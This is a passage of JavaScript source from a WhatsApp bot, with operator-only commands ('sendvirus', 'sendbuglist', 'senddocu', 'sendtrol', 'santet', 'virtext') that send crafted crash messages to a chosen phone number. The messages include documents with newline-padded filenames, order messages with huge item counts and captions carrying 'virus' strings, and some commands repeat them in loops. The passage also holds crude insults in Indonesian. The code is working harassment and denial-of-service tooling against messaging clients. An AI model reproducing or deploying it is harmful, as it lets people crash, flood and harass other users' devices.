\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext1': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext2': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtex3t': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext4': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext5': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext6': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext7': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext8': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext9': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadivirtext10': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibuginvite': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"groupName": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"caption": `🔥 ${teks} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m })
haikal.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibugpayment' : {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
sticSukses(from)
let teks = `${q}`
{
haikal.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER Xyrvzaa`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/@LennX-MODS`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
//=================================================//
case 'jadibugsw': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
joau = fs.readFileSync('./baseikal/video/haikal.mp4')
haikal.sendMessage(from, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibugbutton':
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
const buttonssk = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonnnnmMessage = {
text: `🔥 ${teks} ${bugsw}`,
footerText: '🔥 ${teks} ',
buttons: buttonssk,
headerType: 1
}
haikal.sendMessage(from, buttonnnnmMessage)
sticSukses(from)
}
 break
//=================================================//
case 'sendbuglist': case 'sendbuglist2': case 'sendbuglist3': case 'sendbuglist4': case 'sendbuglist5':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
touchmebre = [
{
title: `🌷 Xyrvzaa WA 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
haikal.sendListMsg(bnnd, `🌷 Xyrvzaa WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
sticSukses(from)
break
//=================================================//
case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY Xyrvzaa",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281717802873@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
sticSukses(from)
}
break
//=================================================//
case 'senddocu': case 'senddocu3': case 'senddocu4': case 'senddocu5': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from })
haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
sticSukses(from)
}
break
//=================================================//
case 'senddocu2': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 Xyrvzaa☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: from })
haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
sticSukses(from)
}
break
//=================================================//
case 'virtext1': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext2': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext3': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${iphone2}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext4': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${iphone3}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext5': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${iphone4}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext6': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${iphone5}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext7': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${iphone6}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext8': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext9': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext10': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Xyrvzaa${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
}
break
case 'sendvirus': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${iphone}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus2': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${iphone1}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus3': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${iphone2}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus4': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${iphone3}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus5': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${iphone4}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus6': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${iphone5}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus7': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${iphone6}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus8': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${buttonkal}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus9': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus10': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `Xyrvzaa${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'jadijago': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
caption: ` ${teks}  ${buttonkal}`,
footer: ` ${teks} `,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🛡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🔧'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🪞'}}],
headerType: 5
}
haikal.sendMessage(from, message, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© Xyrvzaa${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
break
//=================================================//
case 'sendlokas2': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(from, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© Xyrvzaa${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, location.message, { messageId: location.key.id })
sticSukses(from)
}
break
//=================================================//
case 'sendtrol2': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© Xyrvzaa${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© Xyrvzaa${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
sticSukses(from)
}
break
//=================================================//
//=================================================//
case 'button': 
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku lennzzxy`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "𝙘𝙞𝙡𝙤 𝙗𝙤𝙩",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
haikal.sendMessage(from, buttonMessage)
sticSukses(from)
}
 break
//=================================================//
// BUG OWNER
case 'santet': case 'santet2': case 'santet3': case 'santet4': case 'santet5': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER Xyrvzaa`,
}
}}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
sticSukses(from)
}
break
//=================================================//
case 'jagoan' : {
if (!isCreator) return m.reply(mess.owner)
